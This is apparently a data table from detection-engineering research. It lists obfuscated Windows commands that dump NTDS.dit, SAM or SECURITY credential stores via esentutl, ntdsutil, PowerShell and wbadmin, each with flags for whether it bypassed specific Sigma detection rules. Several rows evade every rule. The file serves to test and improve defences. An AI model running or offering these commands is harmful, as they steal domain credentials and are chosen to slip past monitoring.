Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101		"copy C:\Windows\System32\esentutl.exe C:\temp\dbtool.exe && C:\temp\dbtool.exe /""p"" C:\temp\ntds.dit"	TRUE	TRUE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101	"cmd.exe /c ""copy C:\Windows\System32\esentutl.exe C:\temp\dbtool.exe && C:\temp\dbtool.exe /P C:\temp\ntds.dit"""	copy C:\Windows\System32\esentutl.exe C:\temp\dbtool.exe && C:\temp\dbtool.exe /P C:\temp\ntds.dit	TRUE	FALSE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Esentutl Gather Credentials (7df1713a-1a5b-4a4b-a071-dc83b144a101); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101		"esentutl.exe ""/p"" C:\temp\ntds.dit"	TRUE	TRUE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08)
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101		"esentutl.exe ""/p"""" C:\temp\ntds.dit"	TRUE	TRUE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08)
t1003.003	proc_creation_win_ntdsutil_susp_usage	Suspicious Usage Of Active Directory Diagnostic Tool (ntdsutil.exe)	a58353df-af43-4753-bad0-cd83ef35eef5		"copy C:\Windows\System32\ntdsutil.exe C:\temp\win_diag.exe && C:\temp\win_diag.exe snapshot ""mount c2b3e2c6-1ffb-4625-ba8e-3503c27a9fcb"" quit quit"	TRUE	TRUE	FALSE	Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.003	proc_creation_win_susp_ntds	Suspicious Process Patterns NTDS.DIT Exfil	8bc64091-6875-4881-aaf9-7bd25b5dda08		"cmd.exe -""c"" ntdsutil ""a^c i ntds"" ifm ""cre^ate full C:\exfil"" q q"	TRUE	TRUE	TRUE	
t1003.003	proc_creation_win_susp_ntds	Suspicious Process Patterns NTDS.DIT Exfil	8bc64091-6875-4881-aaf9-7bd25b5dda08		"powershell.exe -Command ""Copy-Item ('C:\Windows\NTDS\nt' + 'ds.dit') -Destination 'C:\exfil\data.bin'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1003.003	proc_creation_win_susp_ntds	Suspicious Process Patterns NTDS.DIT Exfil	8bc64091-6875-4881-aaf9-7bd25b5dda08		"powershell.exe -""Command"" ""Copy-Item ('C:\Windows\NTDS\nt' + 'ds.dit') -Destination 'C:\exfil\data.bin'"""	FALSE	FALSE	FALSE	
t1003.003	proc_creation_win_susp_ntds	Suspicious Process Patterns NTDS.DIT Exfil	8bc64091-6875-4881-aaf9-7bd25b5dda08		"powershell.exe -commaNd ""Copy-Item ('C:\Windows\NTDS\nt' + 'ds.dit') -Destination 'C:\exfil\data.bin'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1003.003	proc_creation_win_susp_ntds	Suspicious Process Patterns NTDS.DIT Exfil	8bc64091-6875-4881-aaf9-7bd25b5dda08		"powershell.exe -c ""Copy-Item ('C:\Windows\NTDS\nt' + 'ds.dit') -Destination 'C:\exfil\data.bin'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1003.003	proc_creation_win_susp_ntds	Suspicious Process Patterns NTDS.DIT Exfil	8bc64091-6875-4881-aaf9-7bd25b5dda08		"powershell.exe /""Command"" ""Copy-Item ('C:\Windows\NTDS\nt' + 'ds.dit') -Destination 'C:\exfil\data.bin'"""	FALSE	FALSE	FALSE	
t1003.003	proc_creation_win_susp_ntds	Suspicious Process Patterns NTDS.DIT Exfil	8bc64091-6875-4881-aaf9-7bd25b5dda08		"powershell.exe -COmMAnd ""Copy-Item ('C:\Windows\NTDS\nt' + 'ds.dit') -Destination 'C:\exfil\data.bin'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1003.003	proc_creation_win_susp_ntds	Suspicious Process Patterns NTDS.DIT Exfil	8bc64091-6875-4881-aaf9-7bd25b5dda08		"powershell.exe -COMMAnD ""Copy-Item ('C:\Windows\NTDS\nt' + 'ds.dit') -Destination 'C:\exfil\data.bin'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1003.003	proc_creation_win_susp_ntds	Suspicious Process Patterns NTDS.DIT Exfil	8bc64091-6875-4881-aaf9-7bd25b5dda08		"powershell.exe -coMMAND ""Copy-Item ('C:\Windows\NTDS\nt' + 'ds.dit') -Destination 'C:\exfil\data.bin'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1003.003	proc_creation_win_wbadmin_dump_sensitive_files	Sensitive File Dump Via Wbadmin.EXE	8b93a509-1cb8-42e1-97aa-ee24224cdc15		"cmd.exe /C wbadmin start backup -""backupTarget:e:"" /""include:C:\Windows\System32\conf^ig\SAM"""	TRUE	TRUE	TRUE	
t1003.003	proc_creation_win_wbadmin_dump_sensitive_files	Sensitive File Dump Via Wbadmin.EXE	8b93a509-1cb8-42e1-97aa-ee24224cdc15		"cmd.exe /""c"" wbadmin start backup -BAckuptARgEt:E: -INcLuDE:c:\wIndOWs\System32\CoNF^iG\SAM"	TRUE	TRUE	FALSE	Copying Sensitive Files with Credential Data (e7be6119-fc37-43f0-ad4f-1f3f99be2f9f)
t1003.003	proc_creation_win_wbadmin_dump_sensitive_files	Sensitive File Dump Via Wbadmin.EXE	8b93a509-1cb8-42e1-97aa-ee24224cdc15		"cmd.exe /""c"" wbadmin start backup -backupTarget:e: -""include:C:\Windows\System32\conf^ig\SAM"""	TRUE	TRUE	TRUE	
t1003.003	proc_creation_win_wbadmin_restore_sensitive_files	Sensitive File Recovery From Backup Via Wbadmin.EXE	84972c80-251c-4c3a-9079-4f00aad93938		"cmd.exe /""c"" wbadmin start r^ecovery -veRsIOn:03/31/2024-09:00 -itemtype:File -ItEmS:c:\WIndoWS\systEM32\CONFiG\sECURITY -recoveryTarget:C:\temp"	TRUE	TRUE	FALSE	Copying Sensitive Files with Credential Data (e7be6119-fc37-43f0-ad4f-1f3f99be2f9f); Copying Sensitive Files with Credential Data (e7be6119-fc37-43f0-ad4f-1f3f99be2f9f)
t1003.003	proc_creation_win_wbadmin_restore_sensitive_files	Sensitive File Recovery From Backup Via Wbadmin.EXE	84972c80-251c-4c3a-9079-4f00aad93938		"cmd.exe /""c"" wbadmin start r^ecovery -version:03/31/2024-09:00 -itemtype:File -items:C:\Windows\System32\config\SECURITY -""recoveryTarget:C:\temp"""	TRUE	TRUE	FALSE	Copying Sensitive Files with Credential Data (e7be6119-fc37-43f0-ad4f-1f3f99be2f9f); Copying Sensitive Files with Credential Data (e7be6119-fc37-43f0-ad4f-1f3f99be2f9f)
t1003.003	proc_creation_win_wbadmin_restore_sensitive_files	Sensitive File Recovery From Backup Via Wbadmin.EXE	84972c80-251c-4c3a-9079-4f00aad93938		"cmd.exe /""c"" wbadmin start r^ecovery -version:03/31/2024-09:00 -iteMTYpe:fILe -""items:C:\Windows\System32\config\SECURITY"" -recoveryTarget:C:\temp"	TRUE	TRUE	FALSE	Copying Sensitive Files with Credential Data (e7be6119-fc37-43f0-ad4f-1f3f99be2f9f); Copying Sensitive Files with Credential Data (e7be6119-fc37-43f0-ad4f-1f3f99be2f9f)
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101		esentutl.exe,/p,C:\temp\ntds.dit	TRUE	TRUE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08)
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101	"cmd.exe /c ""copy C:\Windows\System32\esentutl.exe %%temp%%\not_suspicious.exe && %%temp%%\not_suspicious.exe /p /d ntds.dit"""	copy C:\Windows\System32\esentutl.exe %temp%\not_suspicious.exe && %temp%\not_suspicious.exe /p /d ntds.dit	TRUE	FALSE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Esentutl Gather Credentials (7df1713a-1a5b-4a4b-a071-dc83b144a101); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101		"copy C:\Windows\System32\esentutl.exe %temp%\not_suspicious.exe && %temp%\not_suspicious.exe -""p"" /d ntds.dit"	TRUE	TRUE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101	"cmd.exe /c ""copy C:\Windows\System32\esentutl.exe %%temp%%\not_suspicious.exe && %%temp%%\not_suspicious.exe /p /D ntds.dit"""	copy C:\Windows\System32\esentutl.exe %temp%\not_suspicious.exe && %temp%\not_suspicious.exe /p /D ntds.dit	TRUE	FALSE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Esentutl Gather Credentials (7df1713a-1a5b-4a4b-a071-dc83b144a101); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101		"copy C:\Windows\System32\esentutl.exe %temp%\not_suspicious.exe && %temp%\not_suspicious.exe /""p"" -""d"" ntds.dit"	TRUE	TRUE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101	"cmd.exe /c ""copy C:\Windows\System32\esentutl.exe %%temp%%\not_suspicious.exe && %%temp%%\not_suspicious.exe /p -\""d\"" ntds.dit"""	"copy C:\Windows\System32\esentutl.exe %temp%\not_suspicious.exe && %temp%\not_suspicious.exe /p -""d"" ntds.dit"	TRUE	FALSE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Esentutl Gather Credentials (7df1713a-1a5b-4a4b-a071-dc83b144a101); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101	"cmd.exe /c ""copy C:\Windows\System32\esentutl.exe %%temp%%\not_suspicious.exe && %%temp%%\not_suspicious.exe /P /d ntds.dit"""	copy C:\Windows\System32\esentutl.exe %temp%\not_suspicious.exe && %temp%\not_suspicious.exe /P /d ntds.dit	TRUE	FALSE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Esentutl Gather Credentials (7df1713a-1a5b-4a4b-a071-dc83b144a101); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1003.003	proc_creation_win_esentutl_params	Esentutl Gather Credentials	7df1713a-1a5b-4a4b-a071-dc83b144a101		"copy C:\Windows\System32\esentutl.exe %temp%\not_suspicious.exe && %temp%\not_suspicious.exe -""p"" -""d"" ntds.dit"	TRUE	TRUE	FALSE	Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Suspicious Process Patterns NTDS.DIT Exfil (8bc64091-6875-4881-aaf9-7bd25b5dda08); Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
